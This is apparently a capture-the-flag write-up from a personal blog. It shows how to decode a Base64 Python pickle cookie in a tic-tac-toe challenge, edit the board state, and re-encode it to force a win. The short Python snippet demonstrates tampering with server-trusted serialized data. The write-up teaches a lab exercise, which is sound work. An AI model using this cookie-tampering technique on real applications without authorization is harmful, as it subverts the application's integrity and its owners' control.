<!DOCTYPE html>
<html lang="en">
<head>
<!-- 21 Dec. 2022 -->
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Advent of CTF - Challenge 20</title>
<meta name="author" content="Arjen Wiersma" />
<meta name="generator" content="Org Mode" />
<meta description='Writings by Arjen'/>
<link rel='alternate' type='application+rss/xml' title='Writings by Arjen' href='/posts/rss.xml'/>
<link rel="stylesheet" href="../../../css/theme.css?v=20216e086cf8a20ead56908f3be0bcda6af2531ec1a68c9058ee7495590f57ea" type="text/css">
</head>
<body>
<main id="content" class="content">
<header>
<h1 class="title">Advent of CTF - Challenge 20</h1>
<p class="subtitle" role="doc-subtitle">&ldquo;The Game&rdquo;</p>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#org2bc2fe8">Challenge</a></li>
<li><a href="#org33a7af0">Solution</a></li>
</ul>
</div>
</nav>

<section id="outline-container-org2bc2fe8" class="outline-2">
<h2 id="org2bc2fe8">Challenge</h2>
<div class="outline-text-2" id="text-org2bc2fe8">
<p>
In this challenge a change of pace again. You are faced with a game that you are set to loose. How can you still win? Well, hack the game state of course!
</p>

<p>
What you will learn today:
</p>

<ul class="org-ul">
<li>Identify serialized data</li>
<li>Manipulate serialized data</li>
</ul>
</div>
</section>

<section id="outline-container-org33a7af0" class="outline-2">
<h2 id="org33a7af0">Solution</h2>
<div class="outline-text-2" id="text-org33a7af0">
<p>
The challenge loads with a tic-tac-toe board in which <code>O</code> is set to win. Your goal is to make <code>X</code> win.
</p>


<figure id="org9ffcda3">
<img src="index_att/challenge-start.png" alt="challenge-start.png">

<figcaption><span class="figure-number">Figure 1: </span>Game start state</figcaption>
</figure>

<p>
Looking around the webpage you will notice there is a <i>cookie</i> called <code>game</code>. This cookie starts with <code>gA</code>. You will quickly notice that it is a Base64 encoded cookie, as you have seen many times during the CTF.
</p>

<p>
Decoding does not yield anything useful. Examining it in a hex dump is a little more readable.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 1: </span>Examine the cookie</label><pre class="src src-text">$ echo -n "gASVWgAAAAAAAAB9lCiMBWJvYXJklF2UKF2UKIwBT5RoBE5lXZQoaASMAViUaAZlXZQoTmgGaAZlZYwEdHVybpRoBIwIZmluaXNoZWSUiYwGd2lubmVylIwAlIwEc2FuZZSIdS4=" \
  | base64 -d | xxd
00000000: 8004 955a 0000 0000 0000 007d 9428 8c05  ...Z.......}.(..
00000010: 626f 6172 6494 5d94 285d 9428 8c01 4f94  board.].(].(..O.
00000020: 6804 4e65 5d94 2868 048c 0158 9468 0665  h.Ne].(h...X.h.e
00000030: 5d94 284e 6806 6806 6565 8c04 7475 726e  ].(Nh.h.ee..turn
00000040: 9468 048c 0866 696e 6973 6865 6494 898c  .h...finished...
00000050: 0677 696e 6e65 7294 8c00 948c 0473 616e  .winner......san
00000060: 6594 8875 2e                             e..u.   
</pre>
</div>

<p>
Obviously the cookie holds information about the game. There is a reference to a board, turn, finished and winner.
</p>

<p>
Searching around for various types of serialization format you will quickly rule out the most obvious ones, Java nad .Net. You will come to the <a href="https://docs.python.org/3/library/pickle.html">Python Pickle</a>. Lets test that.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 2: </span>Exploring the python pickle library</label><pre class="src src-python">&gt;&gt;&gt; <span class="org-keyword">import</span> base64
&gt;&gt;&gt; <span class="org-keyword">import</span> pickle
&gt;&gt;&gt; <span class="org-variable-name">data</span>=<span class="org-string">"gASVWgAAAAAAAAB9lCiMBWJvYXJklF2UKF2UKIwBT5RoBE5lXZQoaASMAViUaAZlXZQoTmgGaAZlZYwEdHVybpRoBIwIZmluaXNoZWSUiYwGd2lubmVylIwAlIwEc2FuZZSIdS4="</span>
&gt;&gt;&gt; <span class="org-variable-name">game</span>=base64.b64decode(data)
&gt;&gt;&gt; <span class="org-variable-name">exploit</span>=pickle.loads(game)
&gt;&gt;&gt; exploit
{<span class="org-string">'board'</span>: [[<span class="org-string">'O'</span>, <span class="org-string">'O'</span>, <span class="org-constant">None</span>], [<span class="org-string">'O'</span>, <span class="org-string">'X'</span>, <span class="org-string">'X'</span>], [<span class="org-constant">None</span>, <span class="org-string">'X'</span>, <span class="org-string">'X'</span>]], <span class="org-string">'turn'</span>: <span class="org-string">'O'</span>, <span class="org-string">'finished'</span>: <span class="org-constant">False</span>, <span class="org-string">'winner'</span>: <span class="org-string">''</span>, <span class="org-string">'sane'</span>: <span class="org-constant">True</span>}
</pre>
</div>

<p>
That seems like a winner! It loads correctly and shows the complete board and all metadata. Play around with the various options here, will it work when setting <code>winner</code> tp <code>X</code>? or change the turn to <code>X</code>? All these attributes seem to be calculated runtime as well, so no luck. Lets change the board state instead.
</p>

<div class="org-src-container">
<pre class="src src-python"><span class="org-keyword">import</span> base64
<span class="org-keyword">import</span> pickle
<span class="org-variable-name">data</span>=<span class="org-string">"gASVWgAAAAAAAAB9lCiMBWJvYXJklF2UKF2UKIwBT5RoBE5lXZQoaASMAViUaAZlXZQoTmgGaAZlZYwEdHVybpRoBIwIZmluaXNoZWSUiYwGd2lubmVylIwAlIwEc2FuZZSIdS4="</span>
<span class="org-variable-name">game</span>=base64.b64decode(data)
<span class="org-variable-name">exploit</span>=pickle.loads(game)

<span class="org-variable-name">exploit</span>[<span class="org-string">"board"</span>]=[[<span class="org-string">'O'</span>, <span class="org-string">'O'</span>, <span class="org-string">'X'</span>], [<span class="org-string">'O'</span>, <span class="org-constant">None</span>, <span class="org-string">'X'</span>], [<span class="org-constant">None</span>, <span class="org-string">'X'</span>, <span class="org-string">'X'</span>]]

<span class="org-keyword">print</span>( base64.b64encode(pickle.dumps(exploit)).decode(<span class="org-string">'utf-8'</span>))
</pre>
</div>

<p>
Changing the board to a winning state for <code>X</code>, while taking in account the play order, solves the challenge. In this game <code>X</code> started the game, so there has to be 1 <code>O</code> less in order to be a valid board.
</p>

<p>
Do not forget to grab the badge!
</p>


<figure id="org6d27458">
<img src="./index_att/badge.png" alt="badge.png">

</figure>

<p>
Go back to the <a href="../../../index.html">homepage</a>.
</p>
</div>
</section>
</main>
<footer id="postamble" class="status">
<p class="author">Author: Arjen Wiersma</p>
<p class="date">Created: 21 Dec. 2022</p>
</footer>
</body>
</html>